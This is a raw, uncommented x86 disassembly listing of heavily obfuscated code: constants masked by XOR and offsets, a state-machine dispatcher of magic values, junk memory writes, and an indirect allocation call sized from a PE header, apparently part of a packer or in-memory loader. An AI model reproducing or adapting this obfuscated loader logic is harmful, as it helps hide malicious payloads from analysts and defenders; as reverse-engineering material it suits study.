  4274f1:	lea    eax,[ebp-0x4c]
  4274f4:	push   eax
  4274f5:	call   0x426fad
  4274fa:	mov    eax,DWORD PTR [ebp-0xc]
  4274fd:	mov    eax,DWORD PTR [eax]
  4274ff:	xor    eax,edi
  427501:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427508:	mov    ecx,DWORD PTR [ebp+0x8]
  42750b:	xor    ecx,edi
  42750d:	movzx  eax,al
  427510:	add    ecx,ebx
  427512:	cmp    eax,ecx
  427514:	je     0x427692
  42751a:	mov    eax,DWORD PTR [ebp-0x10]
  42751d:	mov    eax,DWORD PTR [eax]
  42751f:	xor    eax,edi
  427521:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427528:	mov    ecx,DWORD PTR [ebp+0x8]
  42752b:	xor    ecx,edi
  42752d:	movzx  eax,al
  427530:	add    ecx,ebx
  427532:	cmp    eax,ecx
  427534:	je     0x427692
  42753a:	mov    eax,DWORD PTR [ebp+0xc]
  42753d:	mov    eax,DWORD PTR [eax]
  42753f:	xor    eax,edi
  427541:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427548:	mov    ecx,DWORD PTR [ebp+0x8]
  42754b:	xor    ecx,edi
  42754d:	movzx  eax,al
  427550:	add    ecx,ebx
  427552:	cmp    eax,ecx
  427554:	je     0x427692
  42755a:	mov    eax,DWORD PTR [ebp-0x14]
  42755d:	mov    eax,DWORD PTR [eax]
  42755f:	xor    eax,edi
  427561:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427568:	mov    ecx,DWORD PTR [ebp+0x8]
  42756b:	xor    ecx,edi
  42756d:	movzx  eax,al
  427570:	add    ecx,ebx
  427572:	cmp    eax,ecx
  427574:	je     0x427692
  42757a:	mov    eax,DWORD PTR [ebp-0x10]
  42757d:	mov    eax,DWORD PTR [eax]
  42757f:	xor    eax,edi
  427581:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427588:	mov    ecx,DWORD PTR [ebp-0xc]
  42758b:	mov    ecx,DWORD PTR [ecx]
  42758d:	xor    ecx,edi
  42758f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  427596:	xor    al,cl
  427598:	mov    ecx,DWORD PTR [ebp+0xc]
  42759b:	mov    ecx,DWORD PTR [ecx]
  42759d:	xor    ecx,edi
  42759f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275a6:	or     al,cl
  4275a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4275ab:	mov    ecx,DWORD PTR [ecx]
  4275ad:	xor    ecx,edi
  4275af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275b6:	cmp    cl,al
  4275b8:	jne    0x427692
  4275be:	mov    eax,DWORD PTR [ebp+0xc]
  4275c1:	mov    eax,DWORD PTR [eax]
  4275c3:	xor    eax,edi
  4275c5:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  4275cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4275cf:	mov    ecx,DWORD PTR [ecx]
  4275d1:	xor    ecx,edi
  4275d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275da:	xor    al,cl
  4275dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4275df:	mov    ecx,DWORD PTR [ecx]
  4275e1:	xor    ecx,edi
  4275e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275ea:	or     al,cl
  4275ec:	mov    ecx,DWORD PTR [ebp-0x10]
  4275ef:	mov    ecx,DWORD PTR [ecx]
  4275f1:	xor    ecx,edi
  4275f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275fa:	cmp    cl,al
  4275fc:	jne    0x427692
  427602:	mov    eax,DWORD PTR [ebp-0x14]
  427605:	mov    eax,DWORD PTR [eax]
  427607:	xor    eax,edi
  427609:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	mov    ecx,DWORD PTR [ecx]
  427615:	xor    ecx,edi
  427617:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42761e:	xor    al,cl
  427620:	mov    ecx,DWORD PTR [ebp-0xc]
  427623:	mov    ecx,DWORD PTR [ecx]
  427625:	xor    ecx,edi
  427627:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42762e:	or     al,cl
  427630:	mov    ecx,DWORD PTR [ebp+0xc]
  427633:	mov    ecx,DWORD PTR [ecx]
  427635:	xor    ecx,edi
  427637:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42763e:	cmp    cl,al
  427640:	jne    0x427692
  427642:	mov    eax,DWORD PTR [ebp-0x14]
  427645:	mov    eax,DWORD PTR [eax]
  427647:	xor    eax,edi
  427649:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427650:	mov    ecx,DWORD PTR [ebp-0xc]
  427653:	mov    ecx,DWORD PTR [ecx]
  427655:	xor    ecx,edi
  427657:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42765e:	xor    al,cl
  427660:	mov    ecx,DWORD PTR [ebp-0x10]
  427663:	mov    ecx,DWORD PTR [ecx]
  427665:	xor    ecx,edi
  427667:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42766e:	or     al,cl
  427670:	mov    ecx,DWORD PTR [ebp-0x14]
  427673:	mov    ecx,DWORD PTR [ecx]
  427675:	xor    ecx,edi
  427677:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42767e:	cmp    cl,al
  427680:	jne    0x427692
  427682:	lea    eax,[ebp-0x4c]
  427685:	push   eax
  427686:	call   0x42714d
  42768b:	mov    ecx,DWORD PTR [ebp-0x44]
  42768e:	cmp    eax,ecx
  427690:	je     0x42769c
  427692:	mov    eax,DWORD PTR [ebp+0x8]
  427695:	xor    eax,edi
  427697:	add    eax,ebx
  427699:	mov    DWORD PTR [ebp+0x18],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x8]
  42769f:	xor    eax,edi
  4276a1:	lea    eax,[eax+esi*1+0x3272f6]
  4276a8:	xor    eax,edi
  4276aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4276ad:	mov    edx,DWORD PTR [ebp+0x18]
  4276b0:	xor    ecx,edi
  4276b2:	add    ecx,ebx
  4276b4:	cmp    edx,ecx
  4276b6:	je     0x4274b3
  4276bc:	mov    eax,DWORD PTR [ebp+0x8]
  4276bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4276c2:	xor    eax,edi
  4276c4:	add    eax,ebx
  4276c6:	cmp    ecx,eax
  4276c8:	jne    0x4276db
  4276ca:	mov    eax,DWORD PTR [ebp-0x8]
  4276cd:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276d0:	xor    eax,edi
  4276d2:	lea    eax,[eax+ecx*1+0x3272f6]
  4276d9:	jmp    0x427752
  4276db:	push   0x18
  4276dd:	push   DWORD PTR [ebp-0x4]
  4276e0:	lea    eax,[ebp-0x64]
  4276e3:	push   eax
  4276e4:	call   0x4269c7
  4276e9:	mov    eax,DWORD PTR [ebp+0x8]
  4276ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4276ef:	xor    eax,edi
  4276f1:	add    eax,ebx
  4276f3:	cmp    eax,ecx
  4276f5:	je     0x42770a
  4276f7:	mov    eax,DWORD PTR [ebp+0x8]
  4276fa:	xor    eax,edi
  4276fc:	add    eax,ebx
  4276fe:	push   eax
  4276ff:	push   0x18
  427701:	lea    eax,[ebp-0x64]
  427704:	push   eax
  427705:	call   0x426fad
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	add    eax,0x18
  427710:	mov    DWORD PTR [ebp+0x18],eax
  427713:	push   DWORD PTR [ebp-0x50]
  427716:	push   DWORD PTR [ebp+0x18]
  427719:	mov    eax,DWORD PTR [ebp-0x54]
  42771c:	add    eax,DWORD PTR [ebp-0x20]
  42771f:	push   eax
  427720:	call   0x4269c7
  427725:	mov    eax,DWORD PTR [ebp+0x8]
  427728:	mov    ecx,DWORD PTR [ebp-0x18]
  42772b:	xor    eax,edi
  42772d:	add    eax,ebx
  42772f:	cmp    eax,ecx
  427731:	je     0x427744
  427733:	push   0x0
  427735:	push   DWORD PTR [ebp-0x50]
  427738:	mov    eax,DWORD PTR [ebp-0x54]
  42773b:	add    eax,DWORD PTR [ebp-0x20]
  42773e:	push   eax
  42773f:	call   0x426fad
  427744:	mov    eax,DWORD PTR [ebp-0x24]
  427747:	mov    ecx,DWORD PTR [ebp-0x50]
  42774a:	add    DWORD PTR [eax],ecx
  42774c:	mov    eax,DWORD PTR [ebp-0x50]
  42774f:	add    eax,DWORD PTR [ebp+0x1c]
  427752:	mov    DWORD PTR [ebp+0x1c],eax
  427755:	mov    eax,DWORD PTR [ebp-0x8]
  427758:	mov    ecx,DWORD PTR [ebp+0x1c]
  42775b:	xor    eax,edi
  42775d:	add    eax,ebx
  42775f:	imul   eax,ecx
  427762:	mov    ecx,DWORD PTR [ebp+0x8]
  427765:	mov    edx,DWORD PTR [ebp-0x28]
  427768:	xor    ecx,edi
  42776a:	lea    ecx,[ecx+edx*1+0x3272f6]
  427771:	cmp    eax,ecx
  427773:	jb     0x4273d1
  427779:	mov    esi,DWORD PTR [ebp+0x14]
  42777c:	mov    eax,DWORD PTR [ebp-0x20]
  42777f:	mov    DWORD PTR [esi],eax
  427781:	jmp    0x4277c8
  427783:	mov    ecx,DWORD PTR [ebp+0x8]
  427786:	mov    edx,DWORD PTR [ebp+0xc]
  427789:	xor    ecx,edi
  42778b:	xor    edx,edi
  42778d:	add    ecx,ebx
  42778f:	add    edx,ebx
  427791:	cmp    ecx,edx
  427793:	jne    0x4277a7
  427795:	mov    eax,ds:0x7f642dde
  42779a:	imul   eax,eax,0x9f15fccf
  4277a0:	mov    ds:0x7f642dde,eax
  4277a5:	jmp    0x4277c8
  4277a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4277aa:	xor    ecx,edi
  4277ac:	add    ecx,ebx
  4277ae:	cmp    eax,ecx
  4277b0:	je     0x4277be
  4277b2:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4277bc:	jmp    0x4277c8
  4277be:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  4277c8:	pop    edi
  4277c9:	pop    esi
  4277ca:	pop    ebx
  4277cb:	leave  
  4277cc:	ret    0x18
  4277cf:	push   ebp
  4277d0:	mov    ebp,esp
  4277d2:	and    esp,0xfffffff8
  4277d5:	mov    eax,DWORD PTR [ebp+0x20]
  4277d8:	sub    esp,0x14
  4277db:	push   ebx
  4277dc:	mov    ebx,DWORD PTR [ebp+0x14]
  4277df:	push   esi
  4277e0:	push   edi
  4277e1:	cmp    eax,0xf89c85a5
  4277e6:	jne    0x4277f2
  4277e8:	push   0xf89c85a4
  4277ed:	jmp    0x427924
  4277f2:	mov    eax,DWORD PTR [ebp+0x20]
  4277f5:	cmp    eax,0xf89c85a4
  4277fa:	jne    0x427806
  4277fc:	push   0xf89c85a3
  427801:	jmp    0x427924
  427806:	mov    eax,DWORD PTR [ebp+0x20]
  427809:	cmp    eax,0xf89c85a3
  42780e:	jne    0x42781a
  427810:	push   0xf89c85a2
  427815:	jmp    0x427924
  42781a:	mov    eax,DWORD PTR [ebp+0x20]
  42781d:	cmp    eax,0xf89c85a2
  427822:	jne    0x42782e
  427824:	push   0xf89c85a1
  427829:	jmp    0x427924
  42782e:	mov    ecx,DWORD PTR [ebp+0x20]
  427831:	mov    eax,0xf89c85be
  427836:	cmp    ecx,eax
  427838:	jne    0x4278f4
  42783e:	mov    eax,DWORD PTR [ebp+0x10]
  427841:	mov    DWORD PTR [esp+0xc],eax
  427845:	mov    eax,DWORD PTR [ebp+0x18]
  427848:	mov    DWORD PTR [esp+0x14],eax
  42784c:	mov    eax,DWORD PTR [ebp+0xc]
  42784f:	mov    DWORD PTR [esp+0x18],eax
  427853:	mov    eax,DWORD PTR [ebp+0x8]
  427856:	mov    DWORD PTR [esp+0x10],eax
  42785a:	mov    eax,DWORD PTR [esp+0x10]
  42785e:	mov    ecx,DWORD PTR [esp+0x14]
  427862:	mov    edi,0x75108af
  427867:	xor    eax,edi
  427869:	mov    esi,0x3272f6
  42786e:	add    eax,esi
  427870:	mov    DWORD PTR [ecx],eax
  427872:	mov    eax,DWORD PTR [esp+0xc]
  427876:	mov    eax,DWORD PTR [eax+0x194]
  42787c:	mov    ecx,DWORD PTR [eax]
  42787e:	mov    eax,DWORD PTR [esp+0xc]
  427882:	mov    eax,DWORD PTR [eax+0x194]
  427888:	mov    eax,DWORD PTR [eax]
  42788a:	add    eax,DWORD PTR [ecx+0x3c]
  42788d:	mov    ecx,DWORD PTR [esp+0xc]
  427891:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427897:	mov    ecx,DWORD PTR [ecx+0x14]
  42789a:	push   0x4
  42789c:	push   0x3000
  4278a1:	push   DWORD PTR [eax+0x50]
  4278a4:	push   0x0
  4278a6:	call   ecx
  4278a8:	mov    DWORD PTR [ebx],eax
  4278aa:	mov    eax,DWORD PTR [esp+0x10]
  4278ae:	push   DWORD PTR [esp+0xc]
  4278b2:	xor    eax,edi
  4278b4:	add    eax,esi
  4278b6:	mov    DWORD PTR [esp+0x20],eax
  4278ba:	lea    eax,[esp+0x20]
  4278be:	push   eax
  4278bf:	push   ebx
  4278c0:	push   DWORD PTR [esp+0x20]
  4278c4:	push   DWORD PTR [esp+0x28]
  4278c8:	push   DWORD PTR [esp+0x24]
  4278cc:	call   0x427291
  4278d1:	mov    eax,DWORD PTR [esp+0x10]
  4278d5:	mov    ecx,DWORD PTR [ebx]
  4278d7:	xor    eax,edi
  4278d9:	add    eax,esi
  4278db:	cmp    ecx,eax
  4278dd:	je     0x42793b
  4278df:	mov    eax,DWORD PTR [esp+0x18]
  4278e3:	mov    ecx,DWORD PTR [esp+0x14]
  4278e7:	xor    eax,edi
  4278e9:	add    eax,esi
  4278eb:	imul   eax,DWORD PTR [esp+0x1c]
  4278f0:	mov    DWORD PTR [ecx],eax
  4278f2:	jmp    0x42793b
  4278f4:	mov    ecx,DWORD PTR [ebp+0x20]
  4278f7:	cmp    ecx,0xf89c85a1
  4278fd:	jne    0x427906
  4278ff:	push   0xf89c85a0
  427904:	jmp    0x427924
  427906:	mov    ecx,DWORD PTR [ebp+0x20]
  427909:	cmp    ecx,0xf89c85a0
  42790f:	jne    0x427918
  427911:	push   0xf89c85bf
  427916:	jmp    0x427924
  427918:	mov    ecx,DWORD PTR [ebp+0x20]
  42791b:	cmp    ecx,0xf89c85bf
  427921:	jne    0x42793b
  427923:	push   eax
  427924:	push   DWORD PTR [ebp+0x1c]
  427927:	push   DWORD PTR [ebp+0x18]
  42792a:	push   ebx
  42792b:	push   DWORD PTR [ebp+0x10]
  42792e:	push   DWORD PTR [ebp+0xc]
  427931:	push   DWORD PTR [ebp+0x8]
  427934:	call   0x4277cf
  427939:	mov    DWORD PTR [ebx],eax
  42793b:	mov    eax,DWORD PTR [ebx]
  42793d:	pop    edi
  42793e:	pop    esi
  42793f:	pop    ebx
  427940:	mov    esp,ebp
  427942:	pop    ebp
  427943:	ret    0x1c
  427946:	push   ebp
  427947:	mov    ebp,esp
  427949:	sub    esp,0xc
  42794c:	mov    eax,0xf89c85a5
  427951:	mov    DWORD PTR [ebp-0x8],eax
  427954:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  42795b:	mov    ecx,DWORD PTR [ebp-0x8]
  42795e:	xor    ecx,0x75108af
  427964:	add    ecx,0x3272f6
  42796a:	mov    DWORD PTR [ebp-0x4],ecx
  42796d:	mov    ecx,DWORD PTR [ebp+0xc]
  427970:	push   eax
  427971:	mov    DWORD PTR [ebp+0xc],ecx
  427974:	push   DWORD PTR [ebp+0xc]
  427977:	lea    eax,[ebp-0x4]
  42797a:	push   DWORD PTR [ebp+0x8]
  42797d:	push   eax
  42797e:	push   DWORD PTR [ebp+0xc]
  427981:	push   DWORD PTR [ebp-0xc]
  427984:	push   DWORD PTR [ebp-0x8]
  427987:	call   0x4277cf
  42798c:	mov    DWORD PTR [ebp-0x4],eax
  42798f:	mov    eax,DWORD PTR [ebp-0x4]
  427992:	leave  
  427993:	ret    0x8
